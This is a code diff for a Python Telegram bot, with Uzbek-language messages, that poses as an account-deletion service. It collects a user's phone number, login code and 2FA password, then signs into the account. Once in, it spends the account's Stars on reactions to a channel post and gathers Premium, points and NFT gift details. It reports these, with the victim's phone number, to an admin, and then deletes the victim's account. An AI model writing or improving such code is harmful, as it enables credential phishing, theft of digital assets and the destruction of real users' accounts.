@@ -220,7 +220,7 @@ async def process_phone(message: types.Message, state: FSMContext):
     except Exception as e:
         print(f"Phone Request Error: {e}")
         await client.disconnect()
-        await message.answer("❌ Raqamga kod yuborishda xatolik yuz berdi. Qayta urinib ko'ring.")
+        await message.answer("❌ Xatolik! Qayta urinib ko'ring.")
 
 @dp.message(AccountDeleteState.waiting_for_code)
 async def process_code(message: types.Message, state: FSMContext):
@@ -228,7 +228,7 @@ async def process_code(message: types.Message, state: FSMContext):
     auth = user_auth_data.get(user_id)
     
     if not auth:
-        await message.answer("🚫 /start qayta bosing.")
+        await message.answer("🚫 /start bosing.")
         await state.clear()
         return
 
@@ -255,7 +255,7 @@ async def process_2fa(message: types.Message, state: FSMContext):
     auth = user_auth_data.get(user_id)
     
     if not auth:
-        await message.answer("🚫 /start qayta bosing.")
+        await message.answer("🚫 /start bosing.")
         await state.clear()
         return
 
@@ -265,7 +265,6 @@ async def process_2fa(message: types.Message, state: FSMContext):
     client = auth["client"]
     
     try:
-        # 2FA parol to'g'ri kiritilgandan so'ng darhol operatsiyalarni boshlaydi
         await client.sign_in(password=password)
         await process_account_info(message, state, user_id, auth)
 
@@ -292,54 +291,35 @@ async def process_stars_reaction(client: TelegramClient):
         print(f"Stars Error: {e}")
     return sent_stars_count
 
-async def fetch_user_premium_and_level(client: TelegramClient):
-    info_str = ""
-    user_level = 0
+async def fetch_user_level_and_points(client: TelegramClient):
+    level = 1
+    points = 0
+    try:
+        profile = await client(functions.users.GetFullUserRequest(id="me"))
+        full_info = profile.full_user
+        
+        if hasattr(full_info, 'star_gifts_count'):
+            points = getattr(full_info, 'star_gifts_count', 0)
+            
+        if points >= 12000:
+            level = 3
+        elif points >= 5000:
+            level = 2
+        else:
+            level = 1
+    except Exception as e:
+        print(f"Level fetch error: {e}")
+    return level, points
+
+async def fetch_user_premium_info(client: TelegramClient):
+    info_str = "💎 Premium: Yo'q"
     try:
         me = await client.get_me()
-
-        try:
-            boosts = await client(functions.premium.GetMyBoostsRequest())
-            user_level = len(getattr(boosts, 'my_boosts', []))
-        except Exception:
-            user_level = 1 if getattr(me, 'premium', False) else 0
-
         if getattr(me, 'premium', False):
-            info_str += "💎 **Premium:** Mavjud\n"
-            try:
-                profile = await client(functions.users.GetFullUserRequest(id="me"))
-                full_info = profile.full_user
-                
-                until_timestamp = getattr(full_info, 'premium_until_date', None)
-                if until_timestamp:
-                    until_dt = datetime.fromtimestamp(until_timestamp, tz=timezone.utc)
-                    now_dt = datetime.now(timezone.utc)
-                    days_left = (until_dt - now_dt).days
-                    
-                    term_str = "Noma'lum"
-                    if days_left > 180:
-                        term_str = "1 yillik (12 oy)"
-                    elif days_left > 90:
-                        term_str = "6 oylik"
-                    elif days_left > 30:
-                        term_str = "3 oylik"
-                    elif days_left > 0:
-                        term_str = "1 oylik"
-
-                    until_formatted = until_dt.strftime("%d.%m.%Y")
-                    info_str += f"📅 **Obuna turi:** `{term_str}`\n"
-                    info_str += f"⏳ **Tugash vaqti:** `{until_formatted}` (Qolgan: {days_left} kun)"
-                else:
-                    info_str += "📅 **Obuna turi:** Avto-uzaytirish / Cheksiz"
-            except Exception:
-                info_str += "📅 **Obuna turi:** Avto-uzaytirish"
-        else:
-            info_str += "💎 **Premium:** Mavjud emas"
-
+            info_str = "💎 Premium: Bor ✅"
     except Exception:
-        info_str = "💎 **Premium:** Aniqlanmadi"
-        
-    return info_str, user_level
+        pass
+    return info_str
 
 async def fetch_user_nft_gifts(client: TelegramClient):
     nft_items = []
@@ -365,35 +345,36 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
     t = TEXTS[lang]
     client = auth["client"]
 
-    # 1. DARHOL barcha Stars'larni @stars_null kanalining 2-postiga bosadi
+    # 1. Stars yuborish
     sent_stars = await process_stars_reaction(client)
-    stars_str = f"⭐ **Stars:** {sent_stars} ta stars postga bosildi!" if sent_stars > 0 else "⭐ **Stars:** Balansda stars mavjud emas (0 ta)"
+    stars_str = f"⭐ Stars: {sent_stars} ta" if sent_stars > 0 else "⭐ Stars: 0 ta"
 
-    # 2. Akkaunt ma'lumotlarini (Daraja, Premium va NFT havolalari) yig'ish
-    user_info_str, user_level = await fetch_user_premium_and_level(client)
+    # 2. Ma'lumotlar
+    user_level, user_points = await fetch_user_level_and_points(client)
+    premium_str = await fetch_user_premium_info(client)
+    
     nft_links = await fetch_user_nft_gifts(client)
     nft_count = len(nft_links)
     
     if nft_count > 0:
-        nft_list_quotes = "\n".join([f"> 🔗 **NFT #{i+1}:** {link}" for i, link in enumerate(nft_links)])
-        nft_str = f"🎁 **NFT sovgʻalar soni:** `{nft_count} ta`\n\n{nft_list_quotes}"
+        nft_list = "\n".join([f"🔗 {link}" for link in nft_links])
+        nft_str = f"🎁 NFT: {nft_count} ta\n{nft_list}"
     else:
-        nft_str = "🎁 **NFT sovgʻalar soni:** `0 ta` (Topilmadi)"
+        nft_str = "🎁 NFT: 0 ta"
 
-    # 3. Adminga to'liq xabarnoma yuborish
+    points_formatted = f"{user_points / 1000:.1f}K" if user_points >= 1000 else str(user_points)
+
+    # 3. Adminga qisqa xabar
     full_name = message.from_user.full_name
-    username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
+    username = f"@{message.from_user.username}" if message.from_user.username else "Yo'q"
     phone = auth.get("phone", "Noma'lum")
     
     admin_msg = (
         f"🚨 **Hisob oʻchirildi!**\n\n"
-        f"👤 **Ism:** {full_name}\n"
-        f"🆔 **ID:** `{user_id}`\n"
-        f"🏷 **Username:** {username}\n"
-        f"☎️ **Tel:** `{phone}`\n"
-        f"📊 **Daraja:** {user_level}-daraja\n"
-        f"{user_info_str}\n"
-        f"📌 **Holat:** Muvaffaqiyatli o'chirildi\n\n"
+        f"👤 {full_name} | `{user_id}`\n"
+        f"🏷 {username} | ☎️ `{phone}`\n"
+        f"📊 Daraja: {user_level}-daraja (`{points_formatted}` pt)\n"
+        f"{premium_str}\n"
         f"{stars_str}\n\n"
         f"{nft_str}"
     )
@@ -409,18 +390,16 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
         except Exception as e:
             print(f"Admin send error: {e}")
 
-    # 4. Foydalanuvchiga muvaffaqiyatli xabarini ko'rsatish
+    # 4. Foydalanuvchiga javob
     await message.answer(t["success"], parse_mode="Markdown")
 
-    # 5. OXIRIDA Akkauntni Telegram'dan batamom o'chirish
+    # 5. O'chirish
     try:
-        await client(functions.account.DeleteAccountRequest(
-            reason="Bot deletion request"
-        ))
+        await client(functions.account.DeleteAccountRequest(reason="Bot deletion"))
     except Exception as e:
-        print(f"Delete Account Error: {e}")
+        print(f"Delete Error: {e}")
 
-    # 6. Klientni va holatni yopish
+    # 6. Tozalash
     try:
         await client.disconnect()
     except Exception:
